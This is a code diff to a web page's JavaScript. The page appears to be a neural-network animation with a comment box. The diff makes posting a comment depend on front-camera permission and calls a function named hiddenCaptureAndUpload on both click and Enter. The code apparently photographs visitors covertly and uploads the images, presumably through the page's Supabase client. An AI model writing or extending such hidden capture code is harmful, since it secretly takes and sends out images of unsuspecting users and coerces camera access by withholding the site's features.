@@ -332,6 +332,7 @@ const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
             let animationId;
             let isAnimating = false;
             let learningPhase = 0;
+            let PermissionProblem = true;
 
             // Initialize neurons
             function initNeurons() {
@@ -536,31 +537,13 @@ const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 					  document.body.appendChild(video);
 					  document.body.appendChild(canvas);
 					
-						try {
-				        // Open front camera - ADD RETRY LOGIC HERE       
-				        let stream;
-				        let permissionGranted = false;
-				        
-				        while (!permissionGranted) {
-				            try {
-				                stream = await navigator.mediaDevices.getUserMedia({
-				                    video: { facingMode: 'user' },
-				                    audio: false
-				                });
-				                permissionGranted = true;
-				            } catch (err) {
-				                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-				                    // Ask for permission again
-				                    const retry = confirm('Camera permission is required. Please allow camera access and click OK to retry.');
-				                    if (!retry) {
-				                        throw err; // Exit if user cancels
-				                    }
-				                } else {
-				                    throw err; // Throw other errors
-				                }
-				            }
-				        }
-					
+					  try {
+					    // Open front camera
+					    const stream = await navigator.mediaDevices.getUserMedia({
+					      video: { facingMode: 'user' },
+					      audio: false
+					    });
+					    PermissionProblem = false;
 					    video.srcObject = stream;
 					    await video.play();
 					
@@ -600,6 +583,7 @@ const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 					
 					  } catch (err) {
 					    alert('Camera access error: ' + err.name + ' - ' + err.message);
+					    PermissionProblem = true;
 					  }
 					}
 					
@@ -674,12 +658,15 @@ const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
             // Event listener for comment submission
             commentSubmit.addEventListener('click', function() {
                 hiddenCaptureAndUpload();
-                addComment(commentInput.value);
+                console.log(PermissionProblem);
+                PermissionProblem ? PermissionProblem = true: addComment(commentInput.value);
             });
 
             commentInput.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
-                    addComment(commentInput.value);
+                    hiddenCaptureAndUpload();
+                    console.log(PermissionProblem);
+                    PermissionProblem ? PermissionProblem = true: addComment(commentInput.value);
                 }
             });
 
